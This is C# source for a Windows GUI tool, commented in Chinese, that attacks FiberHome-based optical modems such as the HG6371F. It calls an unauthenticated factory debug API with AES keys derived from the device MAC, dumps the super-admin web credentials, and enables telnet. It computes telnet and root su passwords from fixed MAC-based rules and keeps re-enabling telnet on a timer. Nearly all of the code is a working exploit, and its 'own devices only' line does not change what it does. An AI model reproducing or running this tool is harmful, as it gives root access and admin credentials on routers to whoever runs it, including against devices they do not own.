// FgTool.cs —— 烽火光猫助手 v1.0
//
// 用途：对烽火（FiberHome）系联通定制光猫（HG6371F / HG5145D 这类从猫），
//       通过未认证的出厂调试接口 /fh_tool/api 开启 telnet，并推算超管与 root 凭据。
//
// 原理（对应正文各节）：
//   1. 探测 80 端口，确认设备在
//   2. 从本机 ARP 表读出网关 MAC
//   3. 用 MAC 派生 AES 的 key/iv（sha256(MAC) 取偶数位 / 每三位一位）
//   4. 调 GetDevInfo / GetAdminAccount / TelnetEnable
//   5. telnet 口令 = "Fh@" + MAC 后 6 位，su 口令 = "hg2x0" + MAC 后 6 位
//
// 仅限自有设备与自有网络使用。

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace FgTool
{
    public class MainForm : Form
    {
        // ---- 界面控件 ----
        private TextBox txtIp;
        private Button btnProbe;
        private Label lblMac;
        private Label lblState;
        private Button btnAll;
        private Button btnInfo;
        private Button btnTelnet;
        private CheckBox chkGuard;
        private TextBox txtSuper;
        private TextBox txtTelnetPwd;
        private TextBox txtSu;
        private Button btnCopySuper;
        private Button btnCopyTelnet;
        private Button btnCopySu;
        private TextBox txtLog;
        private Button btnClear;
        private Timer guardTimer;

        // ---- 运行状态 ----
        private string _ip = "192.168.2.1";
        private string _mac = "";
        private string _key = "";
        private string _iv = "";

        public MainForm()
        {
            Text = "烽火光猫助手 v1.0  ——  一键开启 telnet / 获取口令";
            ClientSize = new Size(724, 664);
            StartPosition = FormStartPosition.CenterScreen;
            FormBorderStyle = FormBorderStyle.FixedSingle;
            MaximizeBox = false;
            AutoScaleMode = AutoScaleMode.Font;
            Font = new Font("Microsoft YaHei UI", 9f, FontStyle.Regular, GraphicsUnit.Point);

            BuildUi();

            guardTimer = new Timer();
            guardTimer.Interval = 30000;
            guardTimer.Tick += GuardTick;

            Shown += OnShown;
            FormClosing += OnClosing;
        }

        // ================= 界面 =================

        private void BuildUi()
        {
            // ---- 1. 设备连接 ----
            GroupBox gbConn = new GroupBox();
            gbConn.Text = "1. 设备连接";
            gbConn.Location = new Point(10, 8);
            gbConn.Size = new Size(704, 84);
            Controls.Add(gbConn);

            Label lbIp = new Label();
            lbIp.Text = "光猫地址:";
            lbIp.Location = new Point(14, 30);
            lbIp.Size = new Size(70, 22);
            gbConn.Controls.Add(lbIp);

            txtIp = new TextBox();
            txtIp.Text = "192.168.2.1";
            txtIp.Location = new Point(88, 27);
            txtIp.Size = new Size(150, 24);
            gbConn.Controls.Add(txtIp);

            btnProbe = new Button();
            btnProbe.Text = "探测设备 && MAC";   // && 显示为单个 &
            btnProbe.Location = new Point(250, 25);
            btnProbe.Size = new Size(150, 28);
            btnProbe.Click += BtnProbeClick;
            gbConn.Controls.Add(btnProbe);

            lblMac = new Label();
            lblMac.Text = "MAC: —";
            lblMac.Location = new Point(412, 30);
            lblMac.Size = new Size(280, 22);
            lblMac.ForeColor = Color.DarkSlateGray;
            gbConn.Controls.Add(lblMac);

            lblState = new Label();
            lblState.Text = "状态: 未探测";
            lblState.Location = new Point(14, 56);
            lblState.Size = new Size(676, 22);
            gbConn.Controls.Add(lblState);

            // ---- 2. 一键操作 ----
            GroupBox gbOps = new GroupBox();
            gbOps.Text = "2. 一键操作";
            gbOps.Location = new Point(10, 98);
            gbOps.Size = new Size(704, 64);
            Controls.Add(gbOps);

            btnAll = new Button();
            btnAll.Text = "★ 一键开启 telnet + 取超管";
            btnAll.Location = new Point(14, 24);
            btnAll.Size = new Size(230, 30);
            btnAll.BackColor = Color.FromArgb(0, 120, 215);
            btnAll.ForeColor = Color.White;
            btnAll.FlatStyle = FlatStyle.Flat;
            btnAll.Click += BtnAllClick;
            gbOps.Controls.Add(btnAll);

            btnInfo = new Button();
            btnInfo.Text = "读取设备信息";
            btnInfo.Location = new Point(256, 24);
            btnInfo.Size = new Size(130, 30);
            btnInfo.Click += BtnInfoClick;
            gbOps.Controls.Add(btnInfo);

            btnTelnet = new Button();
            btnTelnet.Text = "仅开启 telnet";
            btnTelnet.Location = new Point(398, 24);
            btnTelnet.Size = new Size(130, 30);
            btnTelnet.Click += BtnTelnetClick;
            gbOps.Controls.Add(btnTelnet);

            chkGuard = new CheckBox();
            chkGuard.Text = "守护：掉线自动重开";
            chkGuard.Location = new Point(548, 29);
            chkGuard.Size = new Size(150, 24);
            chkGuard.CheckedChanged += ChkGuardChanged;
            gbOps.Controls.Add(chkGuard);

            // ---- 3. 凭据 ----
            GroupBox gbCred = new GroupBox();
            gbCred.Text = "3. 凭据（按 MAC 派生，非爆破）";
            gbCred.Location = new Point(10, 168);
            gbCred.Size = new Size(704, 168);
            Controls.Add(gbCred);

            gbCred.Controls.Add(MakeLabel("超级管理员（Web）", 14, 26));
            txtSuper = MakeReadonlyBox(180, 23, 410);
            gbCred.Controls.Add(txtSuper);
            btnCopySuper = MakeCopyButton(600, 22);
            btnCopySuper.Click += delegate { CopyText(txtSuper, "超管凭据"); };
            gbCred.Controls.Add(btnCopySuper);

            gbCred.Controls.Add(MakeLabel("telnet 登录", 14, 66));
            txtTelnetPwd = MakeReadonlyBox(180, 63, 410);
            gbCred.Controls.Add(txtTelnetPwd);
            btnCopyTelnet = MakeCopyButton(600, 62);
            btnCopyTelnet.Click += delegate { CopyText(txtTelnetPwd, "telnet 凭据"); };
            gbCred.Controls.Add(btnCopyTelnet);

            gbCred.Controls.Add(MakeLabel("su 提权到 root", 14, 106));
            txtSu = MakeReadonlyBox(180, 103, 410);
            gbCred.Controls.Add(txtSu);
            btnCopySu = MakeCopyButton(600, 102);
            btnCopySu.Click += delegate { CopyText(txtSu, "su 凭据"); };
            gbCred.Controls.Add(btnCopySu);

            Label lbTip = new Label();
            lbTip.Text = "提示：telnet 登录后用 su 提权；设备重启后 telnet 会关闭，需重新开启（或勾选守护）。";
            lbTip.Location = new Point(14, 138);
            lbTip.Size = new Size(676, 22);
            lbTip.ForeColor = Color.DimGray;
            gbCred.Controls.Add(lbTip);

            // ---- 4. 日志 ----
            GroupBox gbLog = new GroupBox();
            gbLog.Text = "4. 日志";
            gbLog.Location = new Point(10, 344);
            gbLog.Size = new Size(704, 308);
            Controls.Add(gbLog);

            txtLog = new TextBox();
            txtLog.Location = new Point(12, 22);
            txtLog.Size = new Size(680, 248);
            txtLog.Multiline = true;
            txtLog.ScrollBars = ScrollBars.Vertical;
            txtLog.ReadOnly = true;
            txtLog.WordWrap = false;
            txtLog.Font = new Font("Consolas", 9f);
            txtLog.BackColor = Color.FromArgb(30, 30, 30);
            txtLog.ForeColor = Color.Gainsboro;
            gbLog.Controls.Add(txtLog);

            btnClear = new Button();
            btnClear.Text = "清空日志";
            btnClear.Location = new Point(594, 276);
            btnClear.Size = new Size(98, 26);
            btnClear.Click += delegate { txtLog.Clear(); };
            gbLog.Controls.Add(btnClear);
        }

        private Label MakeLabel(string text, int x, int y)
        {
            Label lb = new Label();
            lb.Text = text;
            lb.Location = new Point(x, y);
            lb.Size = new Size(160, 20);
            return lb;
        }

        private TextBox MakeReadonlyBox(int x, int y, int w)
        {
            TextBox box = new TextBox();
            box.Location = new Point(x, y);
            box.Size = new Size(w, 24);
            box.ReadOnly = true;
            box.BackColor = Color.WhiteSmoke;
            return box;
        }

        private Button MakeCopyButton(int x, int y)
        {
            Button btn = new Button();
            btn.Text = "复制";
            btn.Location = new Point(x, y);
            btn.Size = new Size(92, 26);
            return btn;
        }

        // ================= 日志与状态 =================

        private void Log(string msg, string level)
        {
            string line = "[" + DateTime.Now.ToString("HH:mm:ss") + "][" + level + "] " + msg + "\n";
            txtLog.AppendText(line);
            txtLog.SelectionStart = txtLog.TextLength;
            txtLog.ScrollToCaret();
            Application.DoEvents();
        }

        private void Log(string msg)
        {
            Log(msg, "INFO");
        }

        private void SetState(string s)
        {
            lblState.Text = "状态: " + s;
            Application.DoEvents();
        }

        private void CopyText(TextBox box, string what)
        {
            if (box.Text.Length > 0)
            {
                Clipboard.SetText(box.Text);
                Log("已复制" + what, "OK");
            }
        }

        // ================= 密钥与口令派生 =================

        /// <summary>
        /// 由 MAC 派生 /fh_tool/api 的 AES key 与 iv：
        /// d = hex(sha256(MAC大写去分隔符))；key 取 d 的第 2、4、…、32 位，iv 取第 3、6、…、48 位。
        /// </summary>
        public static void DeriveKeys(string macRaw, out string mac, out string key, out string iv)
        {
            mac = Regex.Replace(macRaw, "[^0-9A-Fa-f]", "").ToUpperInvariant();
            if (mac.Length != 12)
                throw new ArgumentException("MAC 长度不是 12 位: " + macRaw);

            byte[] hash;
            using (SHA256 sha = SHA256.Create())
            {
                hash = sha.ComputeHash(Encoding.ASCII.GetBytes(mac));
            }

            StringBuilder hex = new StringBuilder();
            for (int i = 0; i < hash.Length; i++)
            {
                hex.Append(hash[i].ToString("x2"));
            }
            string d = hex.ToString();

            StringBuilder k = new StringBuilder();
            StringBuilder v = new StringBuilder();
            for (int i = 0; i < 16; i++)
            {
                k.Append(d[2 * i + 2]);
                v.Append(d[3 * i + 3]);
            }
            key = k.ToString();
            iv = v.ToString();
        }

        /// <summary>
        /// telnet 登录口令 = "Fh@" + MAC 后 6 位；su 提权口令 = "hg2x0" + MAC 后 6 位。
        /// </summary>
        public static void DeriveCredentials(string mac, out string tnUser, out string tnPass,
                                            out string suUser, out string suPass)
        {
            string last6 = mac.Substring(6, 6).ToUpperInvariant();
            tnUser = "admin";
            tnPass = "Fh@" + last6;
            suUser = "root";
            suPass = "hg2x0" + last6;
        }

        // ================= 接口调用 =================

        /// <summary>
        /// 调用 /fh_tool/api：组 JSON → AES-128-CBC/PKCS7 加密 → Base64 → POST → 解密回原文。
        /// 返回 null 表示无响应；返回 "RAW:..." 表示响应无法解密（原样带回）。
        /// </summary>
        private string CallApi(string func, Dictionary<string, string> extra)
        {
            if (_key.Length == 0)
                throw new InvalidOperationException("密钥未初始化");

            StringBuilder json = new StringBuilder();
            json.Append("{\"index\":\"1\",\"func\":\"").Append(func).Append("\"");
            if (extra != null)
            {
                foreach (KeyValuePair<string, string> kv in extra)
                {
                    json.Append(",\"").Append(kv.Key).Append("\":\"").Append(kv.Value).Append("\"");
                }
            }
            json.Append("}");

            byte[] encrypted;
            using (Aes aes = Aes.Create())
            {
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = Encoding.ASCII.GetBytes(_key);
                aes.IV = Encoding.ASCII.GetBytes(_iv);
                using (ICryptoTransform enc = aes.CreateEncryptor())
                {
                    byte[] plain = Encoding.UTF8.GetBytes(json.ToString());
                    encrypted = enc.TransformFinalBlock(plain, 0, plain.Length);
                }
            }
            string body = Convert.ToBase64String(encrypted);

            string url = "http://" + _ip + "/fh_tool/api";
            string raw = HttpPost(url, body, "text/plain", null);
            if (raw == null || raw.Length == 0)
                return null;

            try
            {
                byte[] cipher = Convert.FromBase64String(raw.Trim());
                byte[] plain;
                using (Aes aes = Aes.Create())
                {
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    aes.Key = Encoding.ASCII.GetBytes(_key);
                    aes.IV = Encoding.ASCII.GetBytes(_iv);
                    using (ICryptoTransform dec = aes.CreateDecryptor())
                    {
                        plain = dec.TransformFinalBlock(cipher, 0, cipher.Length);
                    }
                }
                return Encoding.UTF8.GetString(plain);
            }
            catch
            {
                return "RAW:" + raw;
            }
        }

        private static string HttpPost(string url, string body, string contentType, string extraHeader)
        {
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.Timeout = 12000;
            req.ContentType = contentType;
            req.KeepAlive = false;
            req.ServicePoint.Expect100Continue = false;

            if (extraHeader != null)
            {
                int idx = extraHeader.IndexOf(':');
                req.Headers.Add(extraHeader.Substring(0, idx).Trim(), extraHeader.Substring(idx + 1).Trim());
            }

            byte[] data = Encoding.ASCII.GetBytes(body);
            req.ContentLength = data.Length;
            using (Stream s = req.GetRequestStream())
            {
                s.Write(data, 0, data.Length);
            }

            try
            {
                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                using (StreamReader sr = new StreamReader(resp.GetResponseStream()))
                {
                    return sr.ReadToEnd();
                }
            }
            catch
            {
                return null;
            }
        }

        // ================= 探测 =================

        public static bool TestPort(string host, int port, int timeoutMs)
        {
            TcpClient client = new TcpClient();
            try
            {
                try
                {
                    IAsyncResult ar = client.BeginConnect(host, port, null, null);
                    if (ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
                    {
                        client.EndConnect(ar);
                        return true;
                    }
                    return false;
                }
                catch
                {
                    return false;
                }
            }
            finally
            {
                try { client.Close(); }
                catch { }
            }
        }

        /// <summary>
        /// 先 ping 一下把 ARP 表刷出来，再解析 arp -a 里网关那一行的 MAC，返回 12 位大写十六进制。
        /// </summary>
        public static string GetGatewayMac(string gateway)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("ping", "-n 1 -w 1000 " + gateway);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                using (Process p = Process.Start(psi))
                {
                    p.WaitForExit(3000);
                }

                psi = new ProcessStartInfo("arp", "-a");
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;

                string output;
                using (Process p2 = Process.Start(psi))
                {
                    output = p2.StandardOutput.ReadToEnd();
                    p2.WaitForExit(5000);
                }

                Regex re = new Regex("^\\s*" + Regex.Escape(gateway) +
                                     "\\s+([0-9a-fA-F]{2}(?:-[0-9a-fA-F]{2}){5})",
                                     RegexOptions.Multiline);
                Match m = re.Match(output);
                if (m.Success)
                {
                    return m.Groups[1].Value.Replace("-", "").ToUpperInvariant();
                }
                return null;
            }
            catch
            {
                return null;
            }
        }

        // ================= 业务动作 =================

        private bool DoProbe()
        {
            _ip = txtIp.Text.Trim();
            if (_ip.Length == 0)
            {
                Log("请填写光猫地址", "ERR");
                return false;
            }

            Log("目标: " + _ip);
            SetState("探测 80 端口…");
            if (!TestPort(_ip, 80, 3000))
            {
                Log("无法连接 http://" + _ip + "/（80 不通，确认已连上该光猫）", "ERR");
                SetState("设备不可达");
                return false;
            }
            Log("80 端口可达", "OK");

            SetState("获取 MAC…");
            string macRaw = GetGatewayMac(_ip);
            if (macRaw == null)
            {
                Log("ARP 未命中，确认该地址就是光猫网关", "ERR");
                SetState("MAC 获取失败");
                return false;
            }

            string mac, key, iv;
            DeriveKeys(macRaw, out mac, out key, out iv);
            _mac = mac;
            _key = key;
            _iv = iv;

            lblMac.Text = "MAC: " + mac;
            Log("MAC: " + mac, "OK");
            Log("派生 key: " + key);
            Log("派生 iv : " + iv);

            string tnUser, tnPass, suUser, suPass;
            DeriveCredentials(mac, out tnUser, out tnPass, out suUser, out suPass);
            txtTelnetPwd.Text = tnUser + " / " + tnPass;
            txtSu.Text = suUser + " / " + suPass;
            Log("[口令] 由 MAC 派生（非爆破）：telnet = Fh@+MAC后6位，su = hg2x0+MAC后6位", "OK");

            SetState("就绪");
            return true;
        }

        private void DoReadInfo()
        {
            SetState("读取设备信息…");
            string r = CallApi("GetDevInfo", null);
            if (r != null)
                Log("GetDevInfo -> " + r, "OK");
            else
                Log("GetDevInfo 无响应", "WARN");
            SetState("就绪");
        }

        private void DoReadAdmin()
        {
            string r = CallApi("GetAdminAccount", null);
            if (r != null)
            {
                Log("GetAdminAccount -> " + r, "OK");
                Match mUser = Regex.Match(r, "\"adminname\":\"([^\"]*)\"");
                Match mPwd = Regex.Match(r, "\"adminpwd\":\"([^\"]*)\"");
                if (mUser.Success && mPwd.Success)
                {
                    txtSuper.Text = mUser.Groups[1].Value + " / " + mPwd.Groups[1].Value;
                    return;
                }
            }
            else
            {
                Log("GetAdminAccount 无响应（该固件可能不含此函数）", "WARN");
            }
        }

        private bool DoEnableTelnet()
        {
            SetState("开启 telnet…");
            Dictionary<string, string> args = new Dictionary<string, string>();
            args["telnet"] = "1";
            string r = CallApi("TelnetEnable", args);
            Log("TelnetEnable -> " + r);

            Thread.Sleep(2000);

            bool ok = TestPort(_ip, 23, 3000);
            if (ok)
            {
                Log("23 端口已开启", "OK");
                Log("  连接: telnet " + _ip + " 23");
                Log("  登录: " + txtTelnetPwd.Text);
                Log("  提权: su  ->  " + txtSu.Text);
            }
            else
            {
                Log("23 仍未开启，确认设备已完成启动", "ERR");
            }

            SetState("就绪");
            return ok;
        }

        // ================= 事件 =================

        private void BtnProbeClick(object sender, EventArgs e)
        {
            try
            {
                DoProbe();
            }
            catch (Exception ex)
            {
                Log("探测异常: " + ex.Message, "ERR");
            }
        }

        private void BtnInfoClick(object sender, EventArgs e)
        {
            try
            {
                if (_key.Length == 0 && !DoProbe())
                    return;
                DoReadInfo();
            }
            catch (Exception ex)
            {
                Log("异常: " + ex.Message, "ERR");
            }
        }

        private void BtnTelnetClick(object sender, EventArgs e)
        {
            try
            {
                if (_key.Length == 0 && !DoProbe())
                    return;
                DoEnableTelnet();
            }
            catch (Exception ex)
            {
                Log("异常: " + ex.Message, "ERR");
            }
        }

        private void BtnAllClick(object sender, EventArgs e)
        {
            try
            {
                if (!DoProbe())
                    return;
                DoReadInfo();
                DoReadAdmin();
                DoEnableTelnet();
                Log("—— 全部完成 ——", "OK");
            }
            catch (Exception ex)
            {
                Log("异常: " + ex.Message, "ERR");
            }
        }

        private void ChkGuardChanged(object sender, EventArgs e)
        {
            if (chkGuard.Checked)
            {
                if (_key.Length == 0)
                {
                    Log("请先探测设备，再启用守护", "ERR");
                    chkGuard.Checked = false;
                    return;
                }
                guardTimer.Start();
                Log("守护已启用：每 30 秒检查，23 关闭即自动重开", "OK");
            }
            else
            {
                guardTimer.Stop();
                Log("守护已停止");
            }
        }

        private void GuardTick(object sender, EventArgs e)
        {
            if (_key.Length == 0)
                return;
            if (!TestPort(_ip, 80, 2000))
                return;
            if (TestPort(_ip, 23, 2000))
                return;

            Log("守护：检测到 23 已关闭，自动重开", "WARN");
            Dictionary<string, string> args = new Dictionary<string, string>();
            args["telnet"] = "1";
            string r = CallApi("TelnetEnable", args);
            Log("守护 TelnetEnable -> " + r);
        }

        private void OnShown(object sender, EventArgs e)
        {
            Log("烽火光猫助手 v1.0（独立 exe）");
            Log("原理：通过未认证的 /fh_tool/api 工作，密钥仅由 MAC 派生；");
            Log("      口令按 MAC 规则推算（Fh@+后6位 / hg2x0+后6位），非爆破。");
            Log("      点「一键开启 telnet + 取超管」即可。");
            Log("———————————————————————————");
        }

        private void OnClosing(object sender, FormClosingEventArgs e)
        {
            if (guardTimer != null)
            {
                guardTimer.Stop();
                guardTimer.Dispose();
            }
        }

        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }
}
